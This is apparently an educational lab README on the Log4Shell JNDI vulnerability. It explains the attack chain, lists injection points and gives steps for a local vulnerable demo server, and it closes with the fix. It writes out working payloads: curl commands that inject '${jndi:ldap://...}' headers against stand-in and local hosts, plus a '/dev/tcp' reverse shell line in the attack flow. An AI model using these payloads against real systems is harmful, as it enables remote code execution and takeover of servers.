
# Log4Shell: Understanding the JNDI Vulnerability

## Table of Contents
1. [What is JNDI?](#what-is-jndi)
2. [The Vulnerability](#the-vulnerability)
3. [Attack Anatomy](#attack-anatomy)
4. [Why JNDI Enables This Attack](#why-jndi-enables-this-attack)
5. [Real-World Attack Flow](#real-world-attack-flow)
6. [Lab Setup & Prerequisites](#lab-setup--prerequisites)
7. [Running the Demo](#running-the-demo)
8. [Troubleshooting](#troubleshooting)

---

## What is JNDI?

**JNDI** = **J**ava **N**aming and **D**irectory **I**nterface

JNDI is a Java API that allows Java applications to look up data and resources by name from various naming and directory services. Think of it like a phone book or DNS for Java—you give it a name, and it returns the corresponding object or resource.

### What JNDI Can Look Up

JNDI can connect to various directory services:

- **LDAP** - Used for user directories and authentication systems
- **DNS** - Domain Name System lookups
- **File System** - Local file resources
- **Database** - Database connections and resources

---

## The Vulnerability

### The Core Problem

Log4j automatically interprets and executes JNDI lookups embedded in log messages!

When Log4j encounters a string like `${jndi:ldap://...}` in any logged data, it automatically performs the lookup—no questions asked.

---

## Attack Anatomy

### Step 1: Log4j Sees the Payload

```java
log.info("Token: ${jndi:ldap://attacker.com:1389/exploit}");
```

### Step 2: Log4j Automatically Executes JNDI Lookup

```java
// Log4j internally does this:
Context ctx = new InitialContext();
ctx.lookup("ldap://attacker.com:1389/exploit");
```

### Step 3: JNDI Connects to Attacker's LDAP Server

```
Java Application → LDAP Connection → attacker.com:1389
```

### Step 4: Attacker's LDAP Server Responds

```
LDAP Response:
{
  "javaClassName": "Exploit",
  "javaCodeBase": "http://attacker.com/",
  "objectClass": "javaNamingReference"
}
```

This response says: *"The object you're looking for is a Java class. Download it from `http://attacker.com/Exploit.class`"*

### Step 5: JNDI Follows the Reference

```java
// JNDI automatically does:
URL codebase = new URL("http://attacker.com/");
Class<?> cls = codebase.loadClass("Exploit");  // Downloads and loads Exploit.class
Object obj = cls.newInstance();  // Instantiates it - triggers static{} block
```

### Step 6: Attacker's Code Executes

```java
public class Exploit {
    static {
        // This runs when the class is loaded!
        Runtime.getRuntime().exec("malicious command");
    }
}
```

💥 **Remote Code Execution Achieved!**

---

## Why JNDI Enables This Attack

JNDI has a feature called **"remote class loading"** where:

1. LDAP/RMI server can say: *"The object is at this HTTP URL"*
2. JNDI will **download the Java class** from that URL
3. JNDI will **load and instantiate** the class
4. The class's **static initializer runs** → **RCE!**

This was designed for legitimate distributed Java applications, but attackers abused it.

---

## Real-World Attack Flow

### 1. Attacker Injects Malicious Payload

```bash
curl -H 'X-Api-Token: ${jndi:ldap://attacker.com:1389/exploit}' http://target.com/api/login
```

The attacker embeds `${jndi:ldap://...}` in **HTTP headers** or any user-controlled input.

**Common Injection Points:**
- HTTP Headers: `User-Agent`, `X-Forwarded-For`, `X-Api-Token`, `Referer`, `Authorization`
- Query parameters: `?search=${jndi:ldap://...}`
- POST body data: `{"username": "${jndi:ldap://..."}`
- Form fields, cookies, etc.

### 2. Web Server Receives Request

```
GET /api/login HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
X-Api-Token: ${jndi:ldap://attacker.com:1389/exploit}  ← Malicious payload
```

### 3. Multi-Stage Attack Execution

**Stage 1 - JNDI Callback (LDAP)**
```
Victim → LDAP connection → Attacker's LDAP server
```

**Stage 2 - Malicious Class Download (HTTP)**
```
Attacker's LDAP server responds: "Download class from http://evil.com/Exploit.class"
Victim → HTTP GET → Attacker's web server
Victim downloads Exploit.class
```

**Stage 3 - Code Execution**
```
Victim executes Exploit.class
Exploit runs: Runtime.getRuntime().exec("bash -i >& /dev/tcp/attacker/4444 0>&1")
Victim → Reverse shell → Attacker gets full control
```

### Why Is The Callback Important?

**In Lab Environment:**
- The callback **proves the vulnerability was triggered**
- If CallbackMonitor receives a connection → Exploit worked!
- If no connection → Exploit failed

**In Real Attacks:**
- The callback is the **first step** in a multi-stage attack
- It establishes communication between victim and attacker
- Enables delivery of the malicious payload

---

## Lab Setup & Prerequisites

### Install Java 8

```bash
sudo apt update
sudo apt install openjdk-8-jdk

# Set Java 8 as default
sudo update-alternatives --config java
# Select the Java 8 option

# Verify installation
java -version
```

### Install Dependencies

```bash
mvn clean install
```

---

## Running the Demo

You'll need **3 separate terminals** running simultaneously.

### Terminal 1: Start Vulnerable Server

```bash
mvn exec:java -Dexec.mainClass=demo.VulnerableServer
```

Or with explicit vulnerable configuration:

```bash
mvn exec:java -Dexec.mainClass=demo.VulnerableServer \
    -Dlog4j2.formatMsgNoLookups=false \
    -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
```

### Terminal 2: Start Callback Monitor

```bash
mvn exec:java -Dexec.mainClass=demo.CallbackMonitor
```

### Terminal 3: Execute Attack

Single request:
```bash
curl -H 'X-Api-Token: ${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:8080/
```

Multiple requests (for testing):
```bash
for i in {1..10}; do 
    curl -H 'X-Api-Token: ${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:8080/
    sleep 2
done
```

---

## Troubleshooting

### If No Callback Output

Create the Log4j configuration file:

```bash
# Create resources directory if it doesn't exist
mkdir -p src/main/resources

# Create the log4j2.xml file
cat > src/main/resources/log4j2.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>
EOF

# Verify it was created
cat src/main/resources/log4j2.xml

# Rebuild the project
mvn clean compile

# Verify it's in target/classes
ls -la target/classes/log4j2.xml
```

---

## Key Takeaways

🔴 **The Vulnerability**: Log4j automatically processes JNDI lookups in logged strings

🔴 **The Attack Vector**: Any user-controlled input that gets logged can trigger the exploit

🔴 **The Impact**: Remote Code Execution with full system privileges

🔴 **The Fix**: Update to Log4j 2.17.0+ or set `-Dlog4j2.formatMsgNoLookups=true`

---

*This document is for educational purposes only. Understanding vulnerabilities helps build better security.*
